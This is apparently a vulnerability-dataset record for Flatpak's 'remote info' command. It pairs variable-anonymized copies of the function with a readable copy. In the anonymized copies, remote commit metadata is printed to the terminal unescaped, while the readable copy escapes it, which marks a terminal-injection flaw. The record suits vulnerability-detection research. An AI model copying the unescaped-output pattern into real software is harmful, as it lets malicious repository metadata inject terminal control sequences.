g_autofree char *VAR_19 = NULL;
VAR_4(FlatpakRemoteState) VAR_20 = NULL;
gboolean VAR_21 = TRUE;
const char *VAR_22 = NULL;
const char *VAR_23 = NULL;
const char *VAR_24 = NULL;
const char *VAR_25 = NULL;
VAR_4(GKeyFile) VAR_26 = NULL;
guint64 VAR_27 = 0;
guint64 VAR_28 = 0;
g_autofree char *VAR_29 = NULL;
g_autofree char *VAR_30 = NULL;
const gchar *VAR_31 = NULL;
guint64 VAR_32;
g_autofree char *VAR_33 = NULL;
VarMetadataRef VAR_34;
VAR_5 = g_option_context_new (_("" REMOTE REF - Show information about an application or runtime in a remote""));
g_option_context_set_translation_domain (VAR_5, VAR_35);
if (!flatpak_option_context_parse (VAR_5, VAR_36, &VAR_0, &VAR_1,
VAR_37, &VAR_6, VAR_2, VAR_3))
return FALSE;
if (!VAR_38 && !VAR_39)
VAR_38 = VAR_39 = TRUE;
if (VAR_0 < 3)
return usage_error (VAR_5, _(""REMOTE and REF must be specified""), VAR_3);
VAR_9 = VAR_1[1];
VAR_10 = VAR_1[2];
if (!flatpak_resolve_duplicate_remotes (VAR_6, VAR_9, &VAR_7, VAR_2, VAR_3))
return FALSE;
VAR_11 = flatpak_dir_get_remote_default_branch (VAR_7, VAR_9);
VAR_12 = flatpak_kinds_from_bools (VAR_38, VAR_39);
if (!flatpak_split_partial_ref_arg (VAR_10, VAR_12, VAR_40, NULL,
&VAR_13, &VAR_14, &VAR_15, &VAR_16, VAR_3))
return FALSE;
VAR_20 = get_remote_state (VAR_7, VAR_9, VAR_41, VAR_42, VAR_15, NULL, NULL, VAR_3);
if (VAR_20 == NULL)
return FALSE;
VAR_17 = flatpak_dir_find_remote_ref (VAR_7, VAR_20, VAR_14, VAR_16, VAR_11, VAR_15,
VAR_13, VAR_2, VAR_3);
if (VAR_17 == NULL)
return FALSE;
if (VAR_41)
{
if (VAR_43)
VAR_18 = g_strdup (VAR_43);
else if (!flatpak_remote_state_lookup_ref (VAR_20, flatpak_decomposed_get_ref (VAR_17),
&VAR_18, NULL, NULL, NULL, VAR_3))
{
g_assert (VAR_3 == NULL || *VAR_3 != NULL);
return FALSE;
}
}
else
{
VAR_8 = flatpak_remote_state_load_ref_commit (VAR_20, VAR_7, flatpak_decomposed_get_ref (VAR_17),
VAR_43, NULL, &VAR_18, VAR_2, VAR_3);
if (VAR_8 == NULL)
return FALSE;
}
if (flatpak_remote_state_lookup_sparse_cache (VAR_20, flatpak_decomposed_get_ref (VAR_17),
&VAR_34, NULL))
{
VAR_24 = var_metadata_lookup_string (VAR_34, VAR_44, NULL);
VAR_25 = var_metadata_lookup_string (VAR_34, VAR_45, NULL);
}
if (VAR_46 || VAR_47 || VAR_48 || VAR_49 || VAR_50 || VAR_51)
VAR_21 = FALSE;
if (VAR_21)
{
int VAR_52;
int VAR_53, VAR_54;
int VAR_55;
VAR_4(AsMetadata) VAR_56 = as_metadata_new ();
AsComponent *VAR_57 = NULL;
const char *VAR_58 = NULL;
const char *VAR_59 = NULL;
g_autofree char *VAR_60 = flatpak_decomposed_dup_id (VAR_17);
flatpak_get_window_size (&VAR_53, &VAR_54);
flatpak_dir_load_appstream_store (VAR_7, VAR_9, VAR_60, VAR_56, NULL, NULL);
VAR_57 = as_store_find_app (VAR_56, flatpak_decomposed_get_ref (VAR_17));
if (VAR_57)
{
const char *VAR_61 = as_component_get_name (VAR_57);
const char *VAR_62 = as_component_get_summary (VAR_57);
print_wrapped (MIN (VAR_54, 80), ""\n%s - %s\n"", VAR_61, VAR_62);
VAR_58 = as_app_get_version (VAR_57);
VAR_59 = as_component_get_project_license (VAR_57);
}
if (VAR_8)
{
VarCommitRef VAR_63 = var_commit_from_gvariant (VAR_8);
VarMetadataRef VAR_64;
VAR_31 = var_commit_get_subject (VAR_63);
VAR_19 = ostree_commit_get_parent (VAR_8);
VAR_32 = ostree_commit_get_timestamp (VAR_8);
VAR_64 = var_commit_get_metadata (VAR_63);
VAR_22 = var_metadata_lookup_string (VAR_64, ""xa.metadata"", NULL);
if (VAR_22 == NULL)
g_printerr (_(""Warning: Commit has no flatpak metadata\n""));
else
{
VAR_26 = g_key_file_new ();
if (!g_key_file_load_from_data (VAR_26, VAR_22, -1, 0, VAR_3))
return FALSE;
}
VAR_23 = var_metadata_lookup_string (VAR_64, ""ostree.collection-binding"", NULL);
VAR_27 = GUINT64_FROM_BE (var_metadata_lookup_uint64 (VAR_64, ""xa.installed-size"", 0));
VAR_28 = GUINT64_FROM_BE (var_metadata_lookup_uint64 (VAR_64, ""xa.download-size"", 0));
VAR_29 = g_format_size (VAR_27);
VAR_30 = g_format_size (VAR_28);
VAR_33 = format_timestamp (VAR_32);
}
VAR_52 = 0;
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""ID:""), -1));
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Ref:""), -1));
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Arch:""), -1));
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Branch:""), -1));
if (VAR_58 != NULL)
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Version:""), -1));
if (VAR_59 != NULL)
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""License:""), -1));
if (VAR_23 != NULL)
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Collection:""), -1));
if (VAR_30)
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Download:""), -1));
if (VAR_29)
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Installed:""), -1));
if (flatpak_decomposed_is_app (VAR_17) == 0 && VAR_26 != NULL)
{
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Runtime:""), -1));
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Sdk:""), -1));
}
if (VAR_33)
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Date:""), -1));
if (VAR_31)
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Subject:""), -1));
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Commit:""), -1));
if (VAR_19)
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Parent:""), -1));
if (VAR_24)
VAR_52 = MAX (VAR_52, strlen (_(""End-of-life:"")));
if (VAR_25)
VAR_52 = MAX (VAR_52, strlen (_(""End-of-life-rebase:"")));
if (VAR_65)
VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""History:""), -1));
VAR_55 = VAR_54 - (VAR_52 + 1);
print_aligned (VAR_52, _(""ID:""), VAR_60);
print_aligned (VAR_52, _(""Ref:""), flatpak_decomposed_get_ref (VAR_17));
print_aligned_take (VAR_52, _(""Arch:""), flatpak_decomposed_dup_arch (VAR_17));
print_aligned_take (VAR_52, _(""Branch:""), flatpak_decomposed_dup_branch (VAR_17));
if (VAR_58 != NULL)
print_aligned (VAR_52, _(""Version:""), VAR_58);
if (VAR_59 != NULL)
print_aligned (VAR_52, _(""License:""), VAR_59);
if (VAR_23 != NULL)
print_aligned (VAR_52, _(""Collection:""), VAR_23);
if (VAR_30)
print_aligned (VAR_52, _(""Download:""), VAR_30);
if (VAR_29)
print_aligned (VAR_52, _(""Installed:""), VAR_29);
if (flatpak_decomposed_is_app (VAR_17) && VAR_26 != NULL)
{
g_autofree char *VAR_66 = g_key_file_get_string (VAR_26, ""Application"", ""runtime"", VAR_3);
print_aligned (VAR_52, _(""Runtime:""), VAR_66 ? VAR_66 : ""-"");
}
if (flatpak_decomposed_is_app (VAR_17) && VAR_26 != NULL)
{
g_autofree char *VAR_67 = g_key_file_get_string (VAR_26, ""Application"", ""sdk"", VAR_3);
print_aligned (VAR_52, _(""Sdk:""), VAR_67 ? VAR_67 : ""-"");
}
g_print (""\n"");
{
g_autofree char *VAR_68 = ellipsize_string (VAR_18, VAR_55);
print_aligned (VAR_52, _(""Commit:""), VAR_68);
}
if (VAR_19)
{
g_autofree char *VAR_68 = ellipsize_string (VAR_19, VAR_55);
print_aligned (VAR_52, _(""Parent:""), VAR_68);
}
if (VAR_24)
{
g_autofree char *VAR_69 = ellipsize_string (VAR_24, VAR_55);
print_aligned (VAR_52, _(""End-of-life:""), VAR_69);
}
if (VAR_25)
{
g_autofree char *VAR_69 = ellipsize_string (VAR_25, VAR_55);
print_aligned (VAR_52, _(""End-of-life-rebase:""), VAR_69);
}
if (VAR_31)
print_aligned (VAR_52, _(""Subject:""), VAR_31);
if (VAR_33)
print_aligned (VAR_52, _(""Date:""), VAR_33);
if (VAR_65)
{
g_autofree char *VAR_70 = g_strdup (VAR_19);
print_aligned (VAR_52, _(""History:""), ""\n"");
while (VAR_70)
{
g_autofree char *VAR_71 = NULL;
const gchar *VAR_72;
guint64 VAR_73;
g_autofree char *VAR_74 = NULL;
VAR_4(GVariant) VAR_75 = NULL;
VarCommitRef VAR_76;
VAR_75 = flatpak_remote_state_load_ref_commit (VAR_20, VAR_7, flatpak_decomposed_get_ref (VAR_17),
VAR_70, NULL, NULL, VAR_2, NULL);
if (VAR_75 == NULL)
break;
VAR_71 = ostree_commit_get_parent (VAR_75);
VAR_73 = ostree_commit_get_timestamp (VAR_75);
VAR_74 = format_timestamp (VAR_73);
VAR_76 = var_commit_from_gvariant (VAR_75);
VAR_72 = var_commit_get_subject (VAR_76);
print_aligned (VAR_52, _("" Commit:""), VAR_70);
print_aligned (VAR_52, _("" Subject:""), VAR_72);
print_aligned (VAR_52, _("" Date:""), VAR_74);
g_free (VAR_70);
VAR_70 = g_steal_pointer (&VAR_71);
if (VAR_70)
g_print (""\n"");
}
}
}
else
{
VAR_4(GVariant) VAR_77 = NULL;
g_autofree char *VAR_78 = g_strdup (VAR_18);
if (VAR_8)
VAR_77 = g_variant_ref (VAR_8);
do
{
g_autofree char *VAR_70 = NULL;
VAR_4(GVariant) VAR_79 = NULL;
gboolean VAR_80 = TRUE;
if (VAR_77)
{
VAR_79 = g_variant_get_child_value (VAR_77, 0);
VAR_70 = ostree_commit_get_parent (VAR_77);
}
if (VAR_79)
{
g_variant_lookup (VAR_79, ""xa.metadata"", ""&s"", &VAR_22);
if (VAR_22 == NULL)
g_printerr (_(""Warning: Commit %s has no flatpak metadata\n""), VAR_78);
else
{
VAR_26 = g_key_file_new ();
if (!g_key_file_load_from_data (VAR_26, VAR_22, -1, 0, VAR_3))
return FALSE;
}
}
if (VAR_46)
{
maybe_print_space (&VAR_80);
g_print (""%s"", flatpak_decomposed_get_ref (VAR_17));
}
if (VAR_47)
{
maybe_print_space (&VAR_80);
g_print (""%s"", VAR_78);
}
if (VAR_48)
{
maybe_print_space (&VAR_80);
g_print (""%s"", VAR_70 ? VAR_70 : ""-"");
}
if (VAR_50)
{
g_autofree char *VAR_66 = NULL;
maybe_print_space (&VAR_80);
if (VAR_26)
VAR_66 = g_key_file_get_string (VAR_26, flatpak_decomposed_get_kind_metadata_group (VAR_17), ""runtime"", NULL);
g_print (""%s"", VAR_66 ? VAR_66 : ""-"");
}
if (VAR_51)
{
g_autofree char *VAR_67 = NULL;
maybe_print_space (&VAR_80);
if (VAR_26)
VAR_67 = g_key_file_get_string (VAR_26, flatpak_decomposed_get_kind_metadata_group (VAR_17), ""sdk"", NULL);
g_print (""%s"", VAR_67 ? VAR_67 : ""-"");
}
if (!VAR_80)
g_print (""\n"");
if (VAR_49)
{
g_print (""%s"", VAR_22 ? VAR_22 : """");
if (VAR_22 == NULL || !g_str_has_suffix (VAR_22, ""\n""))
g_print (""\n"");
}
g_free (VAR_78);
VAR_78 = g_steal_pointer (&VAR_70);
if (VAR_77)
g_variant_unref (VAR_77);
VAR_77 = NULL;
if (VAR_78 && VAR_65)
VAR_77 = flatpak_remote_state_load_ref_commit (VAR_20, VAR_7,
flatpak_decomposed_get_ref (VAR_17),
VAR_78, NULL, NULL, VAR_2, NULL);
}
while (VAR_77 != NULL);
}
return TRUE;
}",flatpak/6cac99dafe6003c8a4bd5666341c217876536869/flatpak-builtins-remote-info.c/vul/before/0.json,"gboolean
flatpak_builtin_remote_info (int argc, char **argv, GCancellable *cancellable, GError **error)
{
  g_autoptr(GOptionContext) context = NULL;
  g_autoptr(GPtrArray) dirs = NULL;
  g_autoptr(FlatpakDir) preferred_dir = NULL;
  g_autoptr(GVariant) commit_v = NULL;
  const char *remote;
  const char *pref;
  g_autofree char *default_branch = NULL;
  FlatpakKinds kinds;
  FlatpakKinds matched_kinds;
  g_autofree char *match_id = NULL;
  g_autofree char *match_arch = NULL;
  g_autofree char *match_branch = NULL;
  g_autoptr(FlatpakDecomposed) ref = NULL;
  g_autofree char *commit = NULL;
  g_autofree char *parent = NULL;
  g_autoptr(FlatpakRemoteState) state = NULL;
  gboolean friendly = TRUE;
  const char *xa_metadata = NULL;
  const char *collection_id = NULL;
  const char *eol = NULL;
  const char *eol_rebase = NULL;
  g_autoptr(GKeyFile) metakey = NULL;
  guint64 installed_size = 0;
  guint64 download_size = 0;
  g_autofree char *formatted_installed_size = NULL;
  g_autofree char *formatted_download_size = NULL;
  const gchar *subject = NULL;
  guint64 timestamp;
  g_autofree char *formatted_timestamp = NULL;
  VarMetadataRef sparse_cache;

  context = g_option_context_new (_("" REMOTE REF - Show information about an application or runtime in a remote""));
  g_option_context_set_translation_domain (context, GETTEXT_PACKAGE);

  if (!flatpak_option_context_parse (context, options, &argc, &argv,
                                     FLATPAK_BUILTIN_FLAG_STANDARD_DIRS, &dirs, cancellable, error))
    return FALSE;

  if (!opt_app && !opt_runtime)
    opt_app = opt_runtime = TRUE;

  if (argc < 3)
    return usage_error (context, _(""REMOTE and REF must be specified""), error);

  remote = argv[1];
  pref = argv[2];

  if (!flatpak_resolve_duplicate_remotes (dirs, remote, &preferred_dir, cancellable, error))
    return FALSE;

  default_branch = flatpak_dir_get_remote_default_branch (preferred_dir, remote);
  kinds = flatpak_kinds_from_bools (opt_app, opt_runtime);

  if (!flatpak_split_partial_ref_arg (pref, kinds, opt_arch, NULL,
                                      &matched_kinds, &match_id, &match_arch, &match_branch, error))
    return FALSE;

  state = get_remote_state (preferred_dir, remote, opt_cached, opt_sideloaded, match_arch, NULL, NULL, error);
  if (state == NULL)
    return FALSE;

  ref = flatpak_dir_find_remote_ref (preferred_dir, state, match_id, match_branch, default_branch, match_arch,
                                     matched_kinds, cancellable, error);
  if (ref == NULL)
    return FALSE;

  if (opt_cached)
    {
      if (opt_commit)
        commit = g_strdup (opt_commit);
      else if (!flatpak_remote_state_lookup_ref (state, flatpak_decomposed_get_ref (ref),
                                                 &commit, NULL, NULL, NULL, error))
        {
          g_assert (error == NULL || *error != NULL);
          return FALSE;
        }
    }
  else
    {
      commit_v = flatpak_remote_state_load_ref_commit (state, preferred_dir, flatpak_decomposed_get_ref (ref),
                                                       opt_commit, NULL, &commit, cancellable, error);
      if (commit_v == NULL)
        return FALSE;
    }

  if (flatpak_remote_state_lookup_sparse_cache (state, flatpak_decomposed_get_ref (ref),
                                                &sparse_cache, NULL))
    {
      eol = var_metadata_lookup_string (sparse_cache, FLATPAK_SPARSE_CACHE_KEY_ENDOFLINE, NULL);
      eol_rebase = var_metadata_lookup_string (sparse_cache, FLATPAK_SPARSE_CACHE_KEY_ENDOFLINE_REBASE, NULL);
    }

  if (opt_show_ref || opt_show_commit || opt_show_parent || opt_show_metadata || opt_show_runtime || opt_show_sdk)
    friendly = FALSE;

  if (friendly)
    {
      int len;
      int rows, cols;
      int width;
      g_autoptr(AsMetadata) mdata = as_metadata_new ();
      AsComponent *app = NULL;
      const char *version = NULL;
      const char *license = NULL;
      g_autofree char *id = flatpak_decomposed_dup_id (ref);

      flatpak_get_window_size (&rows, &cols);

      flatpak_dir_load_appstream_store (preferred_dir, remote, id, mdata, NULL, NULL);
      app = as_store_find_app (mdata, flatpak_decomposed_get_ref (ref));
      if (app)
        {
          const char *name = as_component_get_name (app);
          const char *comment = as_component_get_summary (app);

          print_wrapped (MIN (cols, 80), ""\n%s - %s\n"", name, comment);

          version = as_app_get_version (app);
          license = as_component_get_project_license (app);
        }

      if (commit_v)
        {
          VarCommitRef var_commit = var_commit_from_gvariant (commit_v);
          VarMetadataRef commit_metadata;

          subject = var_commit_get_subject (var_commit);
          parent = ostree_commit_get_parent (commit_v);
          timestamp = ostree_commit_get_timestamp (commit_v);

          commit_metadata = var_commit_get_metadata (var_commit);
          xa_metadata = var_metadata_lookup_string (commit_metadata, ""xa.metadata"", NULL);

          if (xa_metadata == NULL)
            g_printerr (_(""Warning: Commit has no flatpak metadata\n""));
          else
            {
              metakey = g_key_file_new ();
              if (!g_key_file_load_from_data (metakey, xa_metadata, -1, 0, error))
                return FALSE;
            }

          collection_id = var_metadata_lookup_string (commit_metadata, ""ostree.collection-binding"", NULL);

          installed_size = GUINT64_FROM_BE (var_metadata_lookup_uint64 (commit_metadata, ""xa.installed-size"", 0));
          download_size = GUINT64_FROM_BE (var_metadata_lookup_uint64 (commit_metadata, ""xa.download-size"", 0));

          formatted_installed_size = g_format_size (installed_size);
          formatted_download_size = g_format_size (download_size);
          formatted_timestamp = format_timestamp (timestamp);
        }

      len = 0;
      len = MAX (len, g_utf8_strlen (_(""ID:""), -1));
      len = MAX (len, g_utf8_strlen (_(""Ref:""), -1));
      len = MAX (len, g_utf8_strlen (_(""Arch:""), -1));
      len = MAX (len, g_utf8_strlen (_(""Branch:""), -1));
      if (version != NULL)
        len = MAX (len, g_utf8_strlen (_(""Version:""), -1));
      if (license != NULL)
        len = MAX (len, g_utf8_strlen (_(""License:""), -1));
      if (collection_id != NULL)
        len = MAX (len, g_utf8_strlen (_(""Collection:""), -1));
      if (formatted_download_size)
        len = MAX (len, g_utf8_strlen (_(""Download:""), -1));
      if (formatted_installed_size)
        len = MAX (len, g_utf8_strlen (_(""Installed:""), -1));
      if (flatpak_decomposed_is_app (ref) == 0 && metakey != NULL)
        {
          len = MAX (len, g_utf8_strlen (_(""Runtime:""), -1));
          len = MAX (len, g_utf8_strlen (_(""Sdk:""), -1));
        }
      if (formatted_timestamp)
        len = MAX (len, g_utf8_strlen (_(""Date:""), -1));
      if (subject)
        len = MAX (len, g_utf8_strlen (_(""Subject:""), -1));
      len = MAX (len, g_utf8_strlen (_(""Commit:""), -1));
      if (parent)
        len = MAX (len, g_utf8_strlen (_(""Parent:""), -1));
      if (eol)
        len = MAX (len, strlen (_(""End-of-life:"")));
      if (eol_rebase)
        len = MAX (len, strlen (_(""End-of-life-rebase:"")));
      if (opt_log)
        len = MAX (len, g_utf8_strlen (_(""History:""), -1));

      width = cols - (len + 1);

      print_aligned (len, _(""ID:""), id);
      print_aligned (len, _(""Ref:""), flatpak_decomposed_get_ref (ref));
      print_aligned_take (len, _(""Arch:""), flatpak_decomposed_dup_arch (ref));
      print_aligned_take (len, _(""Branch:""), flatpak_decomposed_dup_branch (ref));
      if (version != NULL)
        print_aligned (len, _(""Version:""), version);
      if (license != NULL)
        print_aligned (len, _(""License:""), license);
      if (collection_id != NULL)
        print_aligned (len, _(""Collection:""), collection_id);
      if (formatted_download_size)
        print_aligned (len, _(""Download:""), formatted_download_size);
      if (formatted_installed_size)
        print_aligned (len, _(""Installed:""), formatted_installed_size);
      if (flatpak_decomposed_is_app (ref) && metakey != NULL)
        {
          g_autofree char *runtime = g_key_file_get_string (metakey, ""Application"", ""runtime"", error);
          print_aligned (len, _(""Runtime:""), runtime ? runtime : ""-"");
        }
      if (flatpak_decomposed_is_app (ref) && metakey != NULL)
        {
          g_autofree char *sdk = g_key_file_get_string (metakey, ""Application"", ""sdk"", error);
          print_aligned (len, _(""Sdk:""), sdk ? sdk : ""-"");
        }
      g_print (""\n"");
      {
        g_autofree char *formatted_commit = ellipsize_string (commit, width);
        print_aligned (len, _(""Commit:""), formatted_commit);
      }
      if (parent)
        {
          g_autofree char *formatted_commit = ellipsize_string (parent, width);
          print_aligned (len, _(""Parent:""), formatted_commit);
        }
      if (eol)
        {
          g_autofree char *formatted_eol = ellipsize_string (eol, width);
          print_aligned (len, _(""End-of-life:""), formatted_eol);
        }
      if (eol_rebase)
        {
          g_autofree char *formatted_eol = ellipsize_string (eol_rebase, width);
          print_aligned (len, _(""End-of-life-rebase:""), formatted_eol);
        }

      if (subject)
        print_aligned (len, _(""Subject:""), subject);
      if (formatted_timestamp)
        print_aligned (len, _(""Date:""), formatted_timestamp);

      if (opt_log)
        {
          g_autofree char *p = g_strdup (parent);

          print_aligned (len, _(""History:""), ""\n"");

          while (p)
            {
              g_autofree char *p_parent = NULL;
              const gchar *p_subject;
              guint64 p_timestamp;
              g_autofree char *p_formatted_timestamp = NULL;
              g_autoptr(GVariant) p_commit_v = NULL;
              VarCommitRef p_commit;

              p_commit_v = flatpak_remote_state_load_ref_commit (state, preferred_dir, flatpak_decomposed_get_ref (ref),
                                                                 p, NULL, NULL, cancellable, NULL);
              if (p_commit_v == NULL)
                break;

              p_parent = ostree_commit_get_parent (p_commit_v);
              p_timestamp = ostree_commit_get_timestamp (p_commit_v);
              p_formatted_timestamp = format_timestamp (p_timestamp);

              p_commit = var_commit_from_gvariant (p_commit_v);
              p_subject = var_commit_get_subject (p_commit);

              print_aligned (len, _("" Commit:""), p);
              print_aligned (len, _("" Subject:""), p_subject);
              print_aligned (len, _("" Date:""), p_formatted_timestamp);

              g_free (p);
              p = g_steal_pointer (&p_parent);
              if (p)
                g_print (""\n"");
            }
        }
    }
  else
    {
      g_autoptr(GVariant) c_v = NULL;
      g_autofree char *c = g_strdup (commit);

      if (commit_v)
        c_v = g_variant_ref (commit_v);

      do
        {
          g_autofree char *p = NULL;
          g_autoptr(GVariant) c_m = NULL;
          gboolean first = TRUE;

          if (c_v)
            {
              c_m = g_variant_get_child_value (c_v, 0);
              p = ostree_commit_get_parent (c_v);
            }

          if (c_m)
            {
              g_variant_lookup (c_m, ""xa.metadata"", ""&s"", &xa_metadata);
              if (xa_metadata == NULL)
                g_printerr (_(""Warning: Commit %s has no flatpak metadata\n""), c);
              else
                {
                  metakey = g_key_file_new ();
                  if (!g_key_file_load_from_data (metakey, xa_metadata, -1, 0, error))
                    return FALSE;
                }
            }

          if (opt_show_ref)
            {
              maybe_print_space (&first);
              g_print (""%s"", flatpak_decomposed_get_ref (ref));
            }

          if (opt_show_commit)
            {
              maybe_print_space (&first);
              g_print (""%s"", c);
            }

          if (opt_show_parent)
            {
              maybe_print_space (&first);
              g_print (""%s"", p ? p : ""-"");
            }

          if (opt_show_runtime)
            {
              g_autofree char *runtime = NULL;
              maybe_print_space (&first);

              if (metakey)
                runtime = g_key_file_get_string (metakey, flatpak_decomposed_get_kind_metadata_group (ref), ""runtime"", NULL);
              g_print (""%s"", runtime ? runtime : ""-"");
            }

          if (opt_show_sdk)
            {
              g_autofree char *sdk = NULL;
              maybe_print_space (&first);

              if (metakey)
                sdk = g_key_file_get_string (metakey, flatpak_decomposed_get_kind_metadata_group (ref), ""sdk"", NULL);
              g_print (""%s"", sdk ? sdk : ""-"");
            }

          if (!first)
            g_print (""\n"");

          if (opt_show_metadata)
            {
              if (xa_metadata != NULL)
                flatpak_print_escaped_string (xa_metadata,
                                              FLATPAK_ESCAPE_ALLOW_NEWLINES
                                              | FLATPAK_ESCAPE_DO_NOT_QUOTE);
              if (xa_metadata == NULL || !g_str_has_suffix (xa_metadata, ""\n""))
                g_print (""\n"");
            }

          g_free (c);
          c = g_steal_pointer (&p);

          if (c_v)
            g_variant_unref (c_v);
          c_v = NULL;

          if (c && opt_log)
            c_v = flatpak_remote_state_load_ref_commit (state, preferred_dir,
                                                        flatpak_decomposed_get_ref (ref),
                                                        c, NULL, NULL, cancellable, NULL);
        }
      while (c_v != NULL);
    }

  return TRUE;
}","gboolean
flatpak_builtin_remote_info (int VAR_0, char **VAR_1, GCancellable *VAR_2, GError **VAR_3)
{
  VAR_4(GOptionContext) VAR_5 = NULL;
  VAR_4(GPtrArray) VAR_6 = NULL;
  VAR_4(FlatpakDir) VAR_7 = NULL;
  VAR_4(GVariant) VAR_8 = NULL;
  const char *VAR_9;
  const char *VAR_10;
  g_autofree char *VAR_11 = NULL;
  FlatpakKinds VAR_12;
  FlatpakKinds VAR_13;
  g_autofree char *VAR_14 = NULL;
  g_autofree char *VAR_15 = NULL;
  g_autofree char *VAR_16 = NULL;
  VAR_4(FlatpakDecomposed) VAR_17 = NULL;
  g_autofree char *VAR_18 = NULL;
  g_autofree char *VAR_19 = NULL;
  VAR_4(FlatpakRemoteState) VAR_20 = NULL;
  gboolean VAR_21 = TRUE;
  const char *VAR_22 = NULL;
  const char *VAR_23 = NULL;
  const char *VAR_24 = NULL;
  const char *VAR_25 = NULL;
  VAR_4(GKeyFile) VAR_26 = NULL;
  guint64 VAR_27 = 0;
  guint64 VAR_28 = 0;
  g_autofree char *VAR_29 = NULL;
  g_autofree char *VAR_30 = NULL;
  const gchar *VAR_31 = NULL;
  guint64 VAR_32;
  g_autofree char *VAR_33 = NULL;
  VarMetadataRef VAR_34;

  VAR_5 = g_option_context_new (_("" REMOTE REF - Show information about an application or runtime in a remote""));
  g_option_context_set_translation_domain (VAR_5, VAR_35);

  if (!flatpak_option_context_parse (VAR_5, VAR_36, &VAR_0, &VAR_1,
                                     VAR_37, &VAR_6, VAR_2, VAR_3))
    return FALSE;

  if (!VAR_38 && !VAR_39)
    VAR_38 = VAR_39 = TRUE;

  if (VAR_0 < 3)
    return usage_error (VAR_5, _(""REMOTE and REF must be specified""), VAR_3);

  VAR_9 = VAR_1[1];
  VAR_10 = VAR_1[2];

  if (!flatpak_resolve_duplicate_remotes (VAR_6, VAR_9, &VAR_7, VAR_2, VAR_3))
    return FALSE;

  VAR_11 = flatpak_dir_get_remote_default_branch (VAR_7, VAR_9);
  VAR_12 = flatpak_kinds_from_bools (VAR_38, VAR_39);

  if (!flatpak_split_partial_ref_arg (VAR_10, VAR_12, VAR_40, NULL,
                                      &VAR_13, &VAR_14, &VAR_15, &VAR_16, VAR_3))
    return FALSE;

  VAR_20 = get_remote_state (VAR_7, VAR_9, VAR_41, VAR_42, VAR_15, NULL, NULL, VAR_3);
  if (VAR_20 == NULL)
    return FALSE;

  VAR_17 = flatpak_dir_find_remote_ref (VAR_7, VAR_20, VAR_14, VAR_16, VAR_11, VAR_15,
                                     VAR_13, VAR_2, VAR_3);
  if (VAR_17 == NULL)
    return FALSE;

  if (VAR_41)
    {
      if (VAR_43)
        VAR_18 = g_strdup (VAR_43);
      else if (!flatpak_remote_state_lookup_ref (VAR_20, flatpak_decomposed_get_ref (VAR_17),
                                                 &VAR_18, NULL, NULL, NULL, VAR_3))
        {
          g_assert (VAR_3 == NULL || *VAR_3 != NULL);
          return FALSE;
        }
    }
  else
    {
      VAR_8 = flatpak_remote_state_load_ref_commit (VAR_20, VAR_7, flatpak_decomposed_get_ref (VAR_17),
                                                       VAR_43, NULL, &VAR_18, VAR_2, VAR_3);
      if (VAR_8 == NULL)
        return FALSE;
    }

  if (flatpak_remote_state_lookup_sparse_cache (VAR_20, flatpak_decomposed_get_ref (VAR_17),
                                                &VAR_34, NULL))
    {
      VAR_24 = var_metadata_lookup_string (VAR_34, VAR_44, NULL);
      VAR_25 = var_metadata_lookup_string (VAR_34, VAR_45, NULL);
    }

  if (VAR_46 || VAR_47 || VAR_48 || VAR_49 || VAR_50 || VAR_51)
    VAR_21 = FALSE;

  if (VAR_21)
    {
      int VAR_52;
      int VAR_53, VAR_54;
      int VAR_55;
      VAR_4(AsMetadata) VAR_56 = as_metadata_new ();
      AsComponent *VAR_57 = NULL;
      const char *VAR_58 = NULL;
      const char *VAR_59 = NULL;
      g_autofree char *VAR_60 = flatpak_decomposed_dup_id (VAR_17);

      flatpak_get_window_size (&VAR_53, &VAR_54);

      flatpak_dir_load_appstream_store (VAR_7, VAR_9, VAR_60, VAR_56, NULL, NULL);
      VAR_57 = as_store_find_app (VAR_56, flatpak_decomposed_get_ref (VAR_17));
      if (VAR_57)
        {
          const char *VAR_61 = as_component_get_name (VAR_57);
          const char *VAR_62 = as_component_get_summary (VAR_57);

          print_wrapped (MIN (VAR_54, 80), ""\n%s - %s\n"", VAR_61, VAR_62);

          VAR_58 = as_app_get_version (VAR_57);
          VAR_59 = as_component_get_project_license (VAR_57);
        }

      if (VAR_8)
        {
          VarCommitRef VAR_63 = var_commit_from_gvariant (VAR_8);
          VarMetadataRef VAR_64;

          VAR_31 = var_commit_get_subject (VAR_63);
          VAR_19 = ostree_commit_get_parent (VAR_8);
          VAR_32 = ostree_commit_get_timestamp (VAR_8);

          VAR_64 = var_commit_get_metadata (VAR_63);
          VAR_22 = var_metadata_lookup_string (VAR_64, ""xa.metadata"", NULL);

          if (VAR_22 == NULL)
            g_printerr (_(""Warning: Commit has no flatpak metadata\n""));
          else
            {
              VAR_26 = g_key_file_new ();
              if (!g_key_file_load_from_data (VAR_26, VAR_22, -1, 0, VAR_3))
                return FALSE;
            }

          VAR_23 = var_metadata_lookup_string (VAR_64, ""ostree.collection-binding"", NULL);

          VAR_27 = GUINT64_FROM_BE (var_metadata_lookup_uint64 (VAR_64, ""xa.installed-size"", 0));
          VAR_28 = GUINT64_FROM_BE (var_metadata_lookup_uint64 (VAR_64, ""xa.download-size"", 0));

          VAR_29 = g_format_size (VAR_27);
          VAR_30 = g_format_size (VAR_28);
          VAR_33 = format_timestamp (VAR_32);
        }

      VAR_52 = 0;
      VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""ID:""), -1));
      VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Ref:""), -1));
      VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Arch:""), -1));
      VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Branch:""), -1));
      if (VAR_58 != NULL)
        VAR_52 = MAX (VAR_52, g_utf8_strlen (_(""Version:""), -1));
      if (VAR_59 != NULL)
